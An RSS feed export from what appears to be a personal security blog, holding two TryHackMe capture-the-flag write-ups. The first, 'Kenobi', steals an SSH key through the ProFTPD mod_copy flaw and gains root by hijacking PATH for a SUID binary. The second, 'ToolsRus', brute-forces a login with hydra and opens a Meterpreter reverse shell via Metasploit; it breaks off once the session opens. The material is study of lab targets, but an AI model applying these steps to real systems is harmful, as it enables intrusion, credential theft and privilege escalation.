&lt;script type="text/javascript"&gt;
&lt;!--//--&gt;&lt;![CDATA[//&gt;&lt;!--
		/*! This file is auto-generated */
		!function(d,l){"use strict";var e=!1,o=!1;if(l.querySelector)if(d.addEventListener)e=!0;if(d.wp=d.wp||{},!d.wp.receiveEmbedMessage)if(d.wp.receiveEmbedMessage=function(e){var t=e.data;if(t)if(t.secret||t.message||t.value)if(!/[^a-zA-Z0-9]/.test(t.secret)){var r,a,i,s,n,o=l.querySelectorAll('iframe[data-secret="'+t.secret+'"]'),c=l.querySelectorAll('blockquote[data-secret="'+t.secret+'"]');for(r=0;r&lt;c.length;r++)c[r].style.display="none";for(r=0;r&lt;o.length;r++)if(a=o[r],e.source===a.contentWindow){if(a.removeAttribute("style"),"height"===t.message){if(1e3&lt;(i=parseInt(t.value,10)))i=1e3;else if(~~i&lt;200)i=200;a.height=i}if("link"===t.message)if(s=l.createElement("a"),n=l.createElement("a"),s.href=a.getAttribute("src"),n.href=t.value,n.host===s.host)if(l.activeElement===a)d.top.location.href=t.value}}},e)d.addEventListener("message",d.wp.receiveEmbedMessage,!1),l.addEventListener("DOMContentLoaded",t,!1),d.addEventListener("load",t,!1);function t(){if(!o){o=!0;var e,t,r,a,i=-1!==navigator.appVersion.indexOf("MSIE 10"),s=!!navigator.userAgent.match(/Trident.*rv:11\./),n=l.querySelectorAll("iframe.wp-embedded-content");for(t=0;t&lt;n.length;t++){if(!(r=n[t]).getAttribute("data-secret"))a=Math.random().toString(36).substr(2,10),r.src+="#?secret="+a,r.setAttribute("data-secret",a);if(i||s)(e=r.cloneNode(!0)).removeAttribute("security"),r.parentNode.replaceChild(e,r)}}}}(window,document);
//--&gt;&lt;!]]&gt;
&lt;/script&gt;&lt;iframe sandbox="allow-scripts" security="restricted" src="https://www.hackingarticles.in/lxd-privilege-escalation/embed/" width="600" height="338" title="&amp;#8220;Lxd Privilege Escalation&amp;#8221; &amp;#8212; Hacking Articles" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"&gt;&lt;/iframe&gt;&lt;/figure&gt;</content:encoded></item><item><title>Kenobi | CTF write-up</title><description>&lt;p&gt;today's CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars  ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9gISqB3tncMmY" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cat-star-wars-9gISqB3tncMmY"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Let's enumerate this machine and see what we're dealing with&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.68.87
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36 UTC&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/kenobi-ctf-write-up/</link><guid isPermaLink="false">5e8c661f75832c27370ae6ca</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 11:40:35 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif" alt="Kenobi | CTF write-up"&gt;&lt;p&gt;today's CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars  ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9gISqB3tncMmY" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cat-star-wars-9gISqB3tncMmY"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Let's enumerate this machine and see what we're dealing with&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.68.87
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36 UTC
Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
Host is up (0.00093s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      39562/udp6  mountd
|   100005  1,2,3      44287/udp   mountd
|   100005  1,2,3      57415/tcp6  mountd
|   100005  1,2,3      58933/tcp   mountd
|   100021  1,3,4      42750/udp6  nlockmgr
|   100021  1,3,4      45283/tcp6  nlockmgr
|   100021  1,3,4      45523/tcp   nlockmgr
|   100021  1,3,4      55170/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)          
2049/tcp open  nfs_acl     2-3 (RPC #100227)
MAC Address: 02:8A:BF:E2:69:EE (Unknown)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel        
Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2020-04-07T06:36:48-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-07T11:36:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-12.41.57.png" class="kg-image" alt="Kenobi | CTF write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-12.54.46.png" class="kg-image" alt="Kenobi | CTF write-up"&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/8McNH1aXZnVyE" width="480" height="258" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/its-a-trap-admiral-ackbar-8McNH1aXZnVyE"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# gobuster dir -u http://10.10.68.87/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.68.87/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/07 11:43:04 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2020/04/07 11:43:22 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;after trying to fuzz for some directories, we didn't find anything so we will keep enumerating until we find something, I will enumerate SMB in case there's anything shared publicly &lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.68.87
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:45 UTC
Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
Host is up (0.00017s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:8A:BF:E2:69:EE (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.68.87\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: &amp;lt;unlimited&amp;gt;
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.68.87\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: &amp;lt;unlimited&amp;gt;
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.68.87\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: &amp;lt;unlimited&amp;gt;
|     Path: C:\var\lib\samba\printers
|     Anonymous access: &amp;lt;none&amp;gt;
|_    Current user access: &amp;lt;none&amp;gt;
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 1.09 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# smbclient //10.10.68.87/anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \&amp;gt; dir
  .                                   D        0  Wed Sep  4 10:49:09 2019
  ..                                  D        0  Wed Sep  4 10:56:07 2019
  log.txt                             N    12237  Wed Sep  4 10:49:09 2019
                9204224 blocks of size 1024. 6855348 blocks available
smb: \&amp;gt; &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Port 111 running the service &lt;strong&gt;rpcbind&lt;/strong&gt;. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number it is prepared to serve.&lt;/p&gt;&lt;p&gt;In our case, port 111 is access to a network file system. Let's use nmap to enumerate this.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.68.87
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:54 UTC
Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
Host is up (0.00025s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1858288.0  6855340.0  22%   16.0T        32000
MAC Address: 02:8A:BF:E2:69:EE (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Use netcat to connect to the machine on the FTP port. We can use searchsploit to find exploits for a particular software version, &lt;strong&gt;Searchsploit&lt;/strong&gt; is basically just a command line search tool for exploit-db.com.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nc 10.10.68.87 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.87]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You ought to have discovered an exploit from ProFtpd's mod_copy module. The mod_copy module actualizes SITE CPFR and SITE CPTO commands, which can be utilized to copy files/directories from one place to another on the server. Any unauthenticated client can use these commands to duplicate documents from any piece of the filesystem to a chosen directory. We realize that the FTP administration is running as the Kenobi user (from the document on the share) and a ssh key is generated for that user.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# mkdir /mnt/kenobiNFS
root@kali:~# mount 10.10.68.87:/var /mnt/kenobiNFS
root@kali:~# cd /mnt/kenobiNFS/
root@kali:/mnt/kenobiNFS# ls -la
total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Apr  7 12:00 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -&amp;gt; /run/lock
drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root       4 Sep  4  2019 run -&amp;gt; /run
drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Apr  7 11:59 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www
root@kali:/mnt/kenobiNFS#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# cp /mnt/kenobiNFS/tmp/id_rsa .
root@kali:~# chmod 600 id_rsa 
root@kali:~# ssh -i id_rsa kenobi@10.10.68.87
The authenticity of host '10.10.68.87 (10.10.68.87)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.68.87' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo &amp;lt;command&amp;gt;".
See "man sudo_root" for details.

kenobi@kenobi:~$ &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and here we are ssh-ing to the kenobi user 😶&lt;/p&gt;&lt;pre&gt;&lt;code&gt;kenobi@kenobi:~$ ls -la
total 40
drwxr-xr-x 5 kenobi kenobi 4096 Sep  4  2019 .
drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -&amp;gt; /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ cat user.txt 
xxxxxxxxxxxxxxxxxxxxxxxxxx224899
kenobi@kenobi:~$ &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Time for some privilege escalation &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/l4Ho9Eed9XDNQ94k0" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/animation-design-illustration-l4Ho9Eed9XDNQ94k0"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;kenobi@kenobi:~$ find / -type f -perm -u=s 2&amp;gt;/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
kenobi@kenobi:~$&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:8a:bf:e2:69:ee  
          inet addr:10.10.68.87  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::8a:bfff:fee2:69ee/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:266307 errors:0 dropped:0 overruns:0 frame:0
          TX packets:231976 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:35103632 (35.1 MB)  TX bytes:112553658 (112.5 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:190 errors:0 dropped:0 overruns:0 frame:0
          TX packets:190 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:14101 (14.1 KB)  TX bytes:14101 (14.1 KB)


kenobi@kenobi:~$&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;kenobi@kenobi:/tmp$ echo /bin/bash &amp;gt; curl 
kenobi@kenobi:/tmp$ chmod +x curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo &amp;lt;command&amp;gt;".
See "man sudo_root" for details.

root@kenobi:/tmp# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
root@kenobi:/tmp# cat /root/
.bash_history  .cache/        root.txt       
.bashrc        .profile       .viminfo       
root@kenobi:/tmp# cat /root/root.txt 
**************************1f02
root@kenobi:/tmp# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;/usr/bin/menu runs as root it does curl server status and kernel version with uname or ifconfig, so i created a curl file and pushed to it a bin bash call gave it permission to be executable and exported the path were the file exists.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/sQL9UPichyoFO" width="480" height="252" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/reaction-sQL9UPichyoFO"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>ToolsRus CTF | write-up</title><description>&lt;p&gt;Hello all, today's challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward.&lt;/p&gt;&lt;p&gt;Let's enumerate the machine&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.27.83
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC
Nmap scan report for ip-10-10-27-83.eu-west-1.&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/toolsrus-ctf-write-up/</link><guid isPermaLink="false">5e873c54c0200b446da05df8</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 03 Apr 2020 13:44:52 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" alt="ToolsRus CTF | write-up"&gt;&lt;p&gt;Hello all, today's challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward.&lt;/p&gt;&lt;p&gt;Let's enumerate the machine&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.27.83
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC
Nmap scan report for ip-10-10-27-83.eu-west-1.compute.internal (10.10.27.83)
Host is up (0.0067s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5d:ea:73:8e:0b:06:60:eb:6f:57:dd:99:f8:33:3d:67 (RSA)
|   256 b6:2c:cb:68:c2:ff:d5:3b:5b:ac:4a:66:b5:d8:6d:33 (ECDSA)
|_  256 93:6c:db:4f:5b:2f:a2:83:1f:3d:b0:f6:5f:03:d7:5f (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
MAC Address: 02:D0:62:08:8F:98 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we have 22 &lt;strong&gt;SSH&lt;/strong&gt;, 80 &lt;strong&gt;HTTP&lt;/strong&gt;, and another &lt;strong&gt;HTTP&lt;/strong&gt; on 1234 running &lt;strong&gt;Tomcat&lt;/strong&gt; and 8009 for &lt;strong&gt;ajp13&lt;/strong&gt; let's have a look what we are dealing with on 80 and check if there's any open directories so we can understand more what we are trying to break&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-14.44.04.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# dirb http://10.10.27.83

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr  3 13:39:07 2020
URL_BASE: http://10.10.27.83/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.27.83/ ----
==&amp;gt; DIRECTORY: http://10.10.27.83/guidelines/                                      
+ http://10.10.27.83/index.html (CODE:200|SIZE:168)                                
+ http://10.10.27.83/protected (CODE:401|SIZE:458)                                 
+ http://10.10.27.83/server-status (CODE:403|SIZE:299)                             
                                                                                   
---- Entering directory: http://10.10.27.83/guidelines/ ----
+ http://10.10.27.83/guidelines/index.html (CODE:200|SIZE:51)                      
                                                                                   
-----------------
END_TIME: Fri Apr  3 13:39:12 2020
DOWNLOADED: 9224 - FOUND: 4
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-14.48.35.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-14.54.50.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;and we have a message in directory &lt;strong&gt;/guidelines&lt;/strong&gt; for Mr bob that forgot maybe to update the Tomcat server and another one &lt;strong&gt;/protected&lt;/strong&gt; that tells us that we are visiting the wrong port, that's fine because we have more in port 1234&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-14.57.36.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.27.83 http-get /protected
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-03 13:53:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.27.83:80/protected
[80][http-get] host: 10.10.27.83   login: bob   password: xxxxxxx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-03 13:53:19
root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;so we know the user and we brute forced the password with hydra let's dig more and see what we can do with our results so far&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-16.46.19.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the version we are on it accepts some code execution and already exist in metasploit which means less work for us, It's all right to be lazy sometimes ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;msf5 exploit(multi/http/tomcat_mgr_upload) &amp;gt; show options 

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  xxxxxxx          no        The password for the specified username
   HttpUsername  bob              no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.27.83      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
   RPORT         1234             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.152.253    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf5 exploit(multi/http/tomcat_mgr_upload) &amp;gt; run

[*] Started reverse TCP handler on 10.10.152.253:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying kDC5cLvVGr0Ljgc6SbP4zI0e0sf...
[*] Executing kDC5cLvVGr0Ljgc6SbP4zI0e0sf...
[*] Undeploying kDC5cLvVGr0Ljgc6SbP4zI0e0sf ...
[*] Sending stage (53906 bytes) to 10.10.27.83
[*] Meterpreter session 1 opened (10.10.152.253:4444 -&amp;gt; 10.10.27.83:47080) at 2020-04-03 14:12:10 +0000

